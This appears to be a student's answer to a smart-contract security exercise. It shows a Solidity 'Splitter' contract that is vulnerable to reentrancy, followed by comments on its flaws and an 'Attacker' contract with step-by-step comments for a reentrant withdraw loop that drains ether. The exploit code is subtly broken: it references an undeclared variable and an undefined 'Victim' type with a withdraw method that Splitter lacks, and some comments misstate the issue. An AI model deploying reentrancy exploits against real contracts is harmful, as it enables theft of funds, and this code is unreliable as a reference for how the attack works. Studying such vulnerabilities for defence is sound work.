/***
* Exercise 3
*
* In this contract, every value sent to the fallback function is
* supposed to be equally split between account one, account two and the
* contract itself. Beside finding out problems with it, how could an attacker
* game this contract and what would be the end result? Additionally,
* please provide a working example of an attacker.
*/


pragma solidity ^0.4.9;

contract Splitter {
    address one;
    address two;

    function Splitter(address _two) {
        if (msg.value > 0) revert();
        one = msg.sender;
        two = _two;
    }

    function () payable {
        uint amount = address(this).balance / 3;
        require(one.call.value(amount)());
        require(two.call.value(amount)());
    }
}

// no mapping for totalBalances is used

// no SafeMath is used

// address one should not be a msg.sender 

//function Splitter should utilize address one as well, has no function type (e.g. public )

// Using call.value will send the provided ether and trigger the execution.

//optionally add *require(msg.data.length == 0)* to prevent invalids calls (if fallback is ONLY used to receive ether)

//The executed code is given all available gas for execution making this type of value transfer against *reentrancy* attack.
//Call triggers code execution without the gas limit



pragma solidity ^0.4.9;

import './Splitter.sol';

//Step 1.Contract Attacker is declared 

contract Attacker {

//Step 2.Cariable s declared, set to type Victim
  Victim s;
  uint public count;

  event LogFallback(uint c, uint balance);

//Step 3.Cast the deployed Victim contract to our Victim type, and set it to be s variable 
  function Attacker(address victim) {
    s = Victim(victim);
  }
//Step 4.Declare function attack
  function attack() {
    v.withdraw();
  }
//Step 5.Declare function payable, this is our fallback function 
  function () payable {
    count++;
    LogFallback(count, this.balance);
    if (count < 10) {
//Step 6. Attack function calls s.withdraw method which calls the deployed Vicitim contract method
//Step 7. One ether is sent to attacker using the withdraw method.Once it arrives, the fallback function is called
//Step 8. Fallback function gets invoked EVERY TIME ether is sent to the Atttacker contract.
      s.withdraw();
    } 
  }
}
//Step 9. LogFallback event fires every time the fallback function is called
//Step 10. if statement stops this function from running more than 10 times and
//keeps thewithdraw() call from running out of gas and having the stolen ether REVERTED
//Step 11. s.withdraw() is called again :(


